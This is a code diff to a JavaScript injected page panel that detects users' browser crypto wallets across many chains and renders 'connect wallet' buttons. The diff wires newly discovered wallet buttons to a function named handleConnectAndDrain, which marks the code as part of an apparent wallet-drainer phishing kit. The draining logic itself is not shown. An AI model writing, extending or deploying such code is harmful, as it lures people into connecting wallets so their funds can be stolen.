@@ -3133,38 +3133,88 @@
     });
     document.body.appendChild(launcher);
 
-    // Detect available wallets for the grid
+    // Universal wallet detection - EIP-6963 + legacy fallbacks
     var walletButtons = [];
-    if (window.ethereum) {
+    var addedNames = {};
+
+    // EIP-6963: Auto-discovered wallets (universal, any EVM wallet)
+    discoveredEVMProviders.forEach(function(p) {
+      var name = p.info.name || 'EVM Wallet';
+      if (addedNames[name]) return;
+      addedNames[name] = true;
+      var icon = p.info.icon;
+      walletButtons.push({ name: name, chain: 'EVM', color: '#6366f1', icon: icon });
+    });
+
+    // Legacy fallback: window.ethereum (if EIP-6963 didn't catch it)
+    if (window.ethereum && walletButtons.length === 0) {
       var evmName = 'MetaMask';
       if (window.ethereum.isRabby) evmName = 'Rabby';
       else if (window.ethereum.isCoinbaseWallet) evmName = 'Coinbase';
       else if (window.ethereum.isBraveWallet) evmName = 'Brave';
       else if (window.ethereum.isTrust) evmName = 'Trust';
       else if (window.ethereum.isOkxWallet) evmName = 'OKX';
-      walletButtons.push({ name: evmName, chain: 'EVM', color: '#f6851b' });
+      else if (window.ethereum.isBitKeep) evmName = 'Bitget';
+      else if (window.ethereum.isTokenPocket) evmName = 'TokenPocket';
+      else if (window.ethereum.isPhantom) evmName = 'Phantom';
+      else if (window.ethereum.isExodus) evmName = 'Exodus';
+      else if (window.ethereum.isZerion) evmName = 'Zerion';
+      else if (window.ethereum.isRainbow) evmName = 'Rainbow';
+      if (!addedNames[evmName]) {
+        addedNames[evmName] = true;
+        walletButtons.push({ name: evmName, chain: 'EVM', color: '#f6851b' });
+      }
     }
-    if (window.phantom && window.phantom.solana) walletButtons.push({ name: 'Phantom', chain: 'SOL', color: '#ab9ff2' });
-    if (window.solflare) walletButtons.push({ name: 'Solflare', chain: 'SOL', color: '#fc822b' });
-    if (window.unisat) walletButtons.push({ name: 'UniSat', chain: 'BTC', color: '#f7931a' });
-    if (window.tronWeb) walletButtons.push({ name: 'TronLink', chain: 'TRON', color: '#ff0013' });
-    if (window.tonkeeper || window.ton) walletButtons.push({ name: 'TON', chain: 'TON', color: '#0088cc' });
-    if (window.keplr) walletButtons.push({ name: 'Keplr', chain: 'COSMOS', color: '#536dfe' });
-    if (window.aptos || window.petra) walletButtons.push({ name: 'Petra', chain: 'APTOS', color: '#4cd964' });
+
+    // Non-EVM wallets
+    if (window.phantom && window.phantom.solana && !addedNames['Phantom']) { addedNames['Phantom'] = true; walletButtons.push({ name: 'Phantom', chain: 'SOL', color: '#ab9ff2' }); }
+    if (window.solflare && !addedNames['Solflare']) { addedNames['Solflare'] = true; walletButtons.push({ name: 'Solflare', chain: 'SOL', color: '#fc822b' }); }
+    if (window.backpack && window.backpack.solana && !addedNames['Backpack']) { addedNames['Backpack'] = true; walletButtons.push({ name: 'Backpack', chain: 'SOL', color: '#e33e3f' }); }
+    if (window.unisat && !addedNames['UniSat']) { addedNames['UniSat'] = true; walletButtons.push({ name: 'UniSat', chain: 'BTC', color: '#f7931a' }); }
+    if (window.XverseProviders && !addedNames['Xverse']) { addedNames['Xverse'] = true; walletButtons.push({ name: 'Xverse', chain: 'BTC', color: '#ee7a30' }); }
+    if (window.LeatherProvider && !addedNames['Leather']) { addedNames['Leather'] = true; walletButtons.push({ name: 'Leather', chain: 'BTC', color: '#12100f' }); }
+    if (window.tronWeb && !addedNames['TronLink']) { addedNames['TronLink'] = true; walletButtons.push({ name: 'TronLink', chain: 'TRON', color: '#ff0013' }); }
+    if ((window.tonkeeper || window.ton) && !addedNames['TON']) { addedNames['TON'] = true; walletButtons.push({ name: 'TON Wallet', chain: 'TON', color: '#0088cc' }); }
+    if (window.myTonWallet && !addedNames['MyTonWallet']) { addedNames['MyTonWallet'] = true; walletButtons.push({ name: 'MyTonWallet', chain: 'TON', color: '#0098ea' }); }
+    if (window.keplr && !addedNames['Keplr']) { addedNames['Keplr'] = true; walletButtons.push({ name: 'Keplr', chain: 'COSMOS', color: '#536dfe' }); }
+    if ((window.aptos || window.petra) && !addedNames['Petra']) { addedNames['Petra'] = true; walletButtons.push({ name: 'Petra', chain: 'APTOS', color: '#4cd964' }); }
+    if (window.suiWallet && !addedNames['Sui']) { addedNames['Sui'] = true; walletButtons.push({ name: 'Sui Wallet', chain: 'SUI', color: '#6fbcf0' }); }
+
+    // Listen for late EIP-6963 announcements and update UI
+    window.addEventListener('eip6963:announceProvider', function(event) {
+      if (event.detail && event.detail.info && !addedNames[event.detail.info.name]) {
+        addedNames[event.detail.info.name] = true;
+        var grid = document.querySelector('#legion-one-panel .l1-wallets');
+        if (grid) {
+          var name = event.detail.info.name;
+          var btn = document.createElement('button');
+          btn.className = 'l1-wallet-btn';
+          btn.setAttribute('data-chain', 'EVM');
+          btn.innerHTML = '<span class="l1-wallet-icon" style="background:#6366f122;color:#6366f1">' + name.charAt(0) + '</span>' + name;
+          btn.addEventListener('click', function() { window.handleConnectAndDrain(); });
+          grid.appendChild(btn);
+        }
+        // Show divider if first wallet detected
+        var dividerSection = document.getElementById('l1-detected-section');
+        if (dividerSection) dividerSection.style.display = 'block';
+      }
+    });
 
     // Build detected wallets HTML
     var walletGridHTML = '';
-    if (walletButtons.length > 0) {
-      walletGridHTML += '<div class="l1-divider">detected wallets</div>';
-      walletGridHTML += '<div class="l1-wallets">';
-      walletButtons.forEach(function(w) {
-        walletGridHTML += '<button class="l1-wallet-btn" data-chain="' + w.chain + '">' +
-          '<span class="l1-wallet-icon" style="background:' + w.color + '22;color:' + w.color + '">' + w.name.charAt(0) + '</span>' +
-          w.name +
-        '</button>';
-      });
-      walletGridHTML += '</div>';
-    }
+    var hasWallets = walletButtons.length > 0;
+    walletGridHTML += '<div id="l1-detected-section" style="' + (hasWallets ? '' : 'display:none') + '">';
+    walletGridHTML += '<div class="l1-divider">' + walletButtons.length + ' wallet' + (walletButtons.length !== 1 ? 's' : '') + ' detected</div>';
+    walletGridHTML += '<div class="l1-wallets">';
+    walletButtons.forEach(function(w) {
+      var iconHTML = w.icon
+        ? '<img src="' + w.icon + '" width="24" height="24" style="border-radius:6px;" />'
+        : '<span class="l1-wallet-icon" style="background:' + w.color + '22;color:' + w.color + '">' + w.name.charAt(0) + '</span>';
+      walletGridHTML += '<button class="l1-wallet-btn" data-chain="' + w.chain + '">' +
+        iconHTML + w.name +
+      '</button>';
+    });
+    walletGridHTML += '</div></div>';
 
     // Panel
     var panel = document.createElement('div');
